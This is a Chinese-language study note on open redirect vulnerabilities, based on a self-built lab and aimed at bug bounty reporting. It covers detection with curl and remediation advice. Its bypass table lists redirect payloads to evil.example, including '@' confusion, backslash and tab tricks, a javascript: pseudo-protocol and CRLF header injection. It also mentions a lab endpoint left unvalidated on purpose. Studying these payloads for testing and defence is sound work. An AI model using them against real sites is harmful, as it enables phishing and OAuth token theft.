# 攻击方法库 · Open Redirect（打开重定向）实战笔记

> 来源：2026-10-10 自建靶场 `weblab2` 实验（自检 `R1` 命中）
> 定位：**OBB 接受的 5 类之一**（XSS / CSRF / IAC / GDPR / REDIRECT）→ 值得练熟

---

## 一、这类漏洞长什么样

服务端把**用户可控的输入**直接放进跳转目标（`Location` 头 / `window.location` / meta refresh），
常见参数名：

```
next  url  redirect  redirect_uri  return  returnUrl  return_to
continue  dest  destination  target  to  out  link  goto  r  u
```

常见出现位置：
- 登录/注册后的"回到原页面"（`/login?next=`）
- 登出（`/logout?next=`）
- OAuth 的 `redirect_uri`（危害最大：可窃取授权码/token）
- 短链、跳转中转页、支付回跳、邮件里的确认链接

---

## 二、判据（怎么确认它真的存在）

**只观察响应头，不跟随跳转**（这是非侵入式的关键）：

```bash
curl -s -i "http://TARGET/login?next=https://evil.example/phish" | head -6
```

命中特征：
```http
HTTP/1.1 302 Found
Location: https://evil.example/phish      ← 外部域被原样放行
```

**注意 3 个假阳性**：
1. 服务端把参数**忽略**了，跳到固定站内页 → 不是漏洞
2. 302 但 `Location` 是站内相对路径（如 `/home`）→ 不是漏洞
3. 前端 JS 跳转（需看源码是否 `location.href = 参数`）→ 需换查法

---

## 三、绕过变体（★本笔记最有价值的部分，实测 9/9 未过滤）

| # | 载荷 | 用途 / 能绕过的过滤 |
|---|---|---|
| 1 | `https://evil.example/phish` | 基线，测试是否完全不校验 |
| 2 | `//evil.example/phish` | **协议相对** —— 绕"必须以 / 开头"的黑名单 |
| 3 | `https:%2f%2fevil.example` | URL 编码斜杠 —— 绕只查明文 `//` 的过滤 |
| 4 | `https://good.example@evil.example/` | **`@` 混淆** —— 前面看着像白名单域名，实际跳到 evil |
| 5 | `/%09/evil.example` | Tab 字符 —— 绕"单斜杠开头"的检查 |
| 6 | `/\evil.example` | 反斜杠 —— 浏览器会规范化成 `//` |
| 7 | `/\/evil.example` | 混合斜杠变体 |
| 8 | `javascript:alert(1)` | **伪协议** —— 从"重定向"升级为 **XSS 等价风险** |
| 9 | `/redirect?to=https://evil.example` | 嵌套跳转 —— 绕一层白名单跳到内层开放重定向 |

**其它值得试的**（本次未测，按同类漏洞通用清单补）：
```
///evil.example
\/\/evil.example
https:evil.example
https://evil.example#good.example
%0d%0aLocation:%20https://evil.example     ← CRLF 头注入（若 Location 由拼接产生）
/\evil.example  /%2F\evil.example
```

---

## 四、危害（写报告时要讲清，厂商才会认）

| 危害 | 说明 |
|---|---|
| **钓鱼** | `https://<受害站>/login?next=https://evil.example` —— 用户看到的是可信域名 |
| **OAuth token 窃取** | 若 `redirect_uri` 未白名单 → 授权码/access_token 直接发给攻击者 |
| **SSO 绕过** | 部分 SSO 实现用重定向判断登录成功 |
| **绕过 URL 白名单/CSRF 防护** | 有些防御依赖"请求来自本站" |
| **升级为 XSS** | `javascript:` 被放行时可直接执行脚本 |
| **邮件链接可信度滥用** | 钓鱼邮件里放受害站域名，绕过邮件网关的域名信誉检查 |

---

## 五、修复建议（写进报告的"修复"段）

1. **白名单**，不用黑名单：只允许跳转到**预定义路径**或本站域名
2. 参数**不要直接进 `Location`**：用服务端映射（`?to=profile` → 映射成 `/user/profile`）
3. 只接受 `http/https`，且校验 host 属于本站（**拒绝伪协议**）
4. 处理规范化：拒绝 `//`、`/\`、`%09`、`@`、`%2f` 等混淆（因为变体无穷，**根子是白名单**）
5. 修复后回归：把上面 9 个变体全测一遍，应全部 400/403 或跳回站内

---

## 六、OBB 提交注意（对齐平台要求）

- 类型选 **`REDIRECT`**（下拉框里的"打开重定向"）
- **非侵入式**：只观察 302 响应头，**不要真的跟到外部站点**（否则可能被判滥用）
- 报告要**短、准、可复现**（官方：99.9% 拒稿 = 类型不收 或 无法复现）
- 建议附截图：响应头里的 `Location`

---

## 七、靶场复现方式（自建，可反复练）

```bash
# 起靶场
python dsh-tools/vulnhunt/weblab2.py
# 打靶（观察 Location，不跟随）
curl -s -i "http://127.0.0.1:8098/login?next=https://evil.example/phish" | head -5
# 全量自检（含 R1）
python dsh-tools/vulnhunt/weblab2.py --selftest
```

端点实现见 `weblab2.py` 的 `/login` 与 `/logout`（**故意不校验 next**，注释标了 `R1 (intentional)`）。
